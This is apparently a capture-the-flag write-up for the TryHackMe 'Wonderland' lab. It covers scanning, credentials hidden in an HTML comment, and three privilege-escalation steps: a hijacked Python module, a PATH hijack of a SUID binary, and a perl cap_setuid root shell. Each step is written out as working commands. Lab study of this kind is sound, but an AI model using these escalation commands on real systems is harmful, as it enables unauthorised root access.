# Wonderland — TryHackMe — Medium

> **Date:** 2026-05-30 **Platform:** TryHackMe **Difficulty:** Medium **Tags:** #linux #web #python #library-hijacking #path-hijacking #capabilities #privesc

---

## Summary

Linux machine themed around Alice in Wonderland. Initial access obtained via credentials hidden in an HTML comment after following a hidden directory path. Privilege escalation involved three steps: Python library hijacking to become rabbit, PATH hijacking via a SUID binary to become hatter, and Linux capabilities abuse on perl to gain root.

---

## Reconnaissance

### Nmap scan

nmap -sC -sV -oN wonderland.txt 10.114.179.126

Open ports:

- 22: SSH OpenSSH 7.6p1 Ubuntu
- 80: HTTP Golang net/http server

---

## Enumeration

### Directory bruteforce

gobuster dir -u http://10.114.179.126 -w /usr/share/wordlists/dirb/common.txt

# Found: /r -> hint: "Keep Going"

Full path: http://10.114.179.126/r/a/b/b/i/t

### Credentials in HTML source

curl http://10.114.179.126/r/a/b/b/i/t

# <p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>

Credentials:

- Username: alice
- Password: HowDothTheLittleCrocodileImproveHisShiningTail

---

## Initial Access

ssh alice@10.114.179.126

Result: Shell as alice

---

## Privilege Escalation

### Step 1 - alice to rabbit (Python Library Hijacking)

sudo -l

# (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

# Script does: import random

Created malicious random.py in same directory:

echo 'import os\nos.system("/bin/bash")' > /home/alice/random.py sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

Result: Shell as rabbit

### Step 2 - rabbit to hatter (PATH Hijacking)

ls /home/rabbit # teaParty SUID binary ltrace ./teaParty # calls system("date") without absolute path

cd /tmp echo '/bin/bash' > date chmod +x date export PATH=/tmp:$PATH /home/rabbit/teaParty

Result: Shell as hatter Password found: WhyIsARavenLikeAWritingDesk?

### Step 3 - hatter to root (Linux Capabilities)

getcap -r / 2>/dev/null

# /usr/bin/perl = cap_setuid+ep

ssh hatter@10.114.179.126 # fresh session for correct gid perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

Result: Root shell

---

## Flags

Note: Flags are INVERTED on this machine!

User flag (in /root/): THM{REDACTED}

Root flag (in /home/alice/): THM{REDACTED}

---

## Lessons Learned

**1.** Hidden directory paths can encode hints in the URL itself — always enumerate recursively and follow thematic clues like "Follow the white rabbit" → `/r/a/b/b/i/t`.

**2.** Python library hijacking is a powerful technique — when a script runs `import random` and you can write to the same directory, creating a malicious `random.py` overrides the real module.

**3.** Linux capabilities like `cap_setuid` on perl are as dangerous as SUID bits — always run `getcap -r / 2>/dev/null` during privesc enumeration.

---

## Attack Chain Summary

nmap -> HTTP + SSH -> gobuster -> /r/a/b/b/i/t -> source HTML -> alice credentials -> SSH alice -> sudo python3 as rabbit -> Python library hijacking (random.py) -> rabbit -> teaParty SUID + ltrace -> PATH hijacking -> hatter -> getcap -> perl cap_setuid -> root

---

## References

- TryHackMe - Wonderland: https://tryhackme.com/room/wonderland
- HackTricks Python Library Hijacking: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#python-library-hijacking
- HackTricks Linux Capabilities: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities
- GTFOBins perl: https://gtfobins.github.io/gtfobins/perl/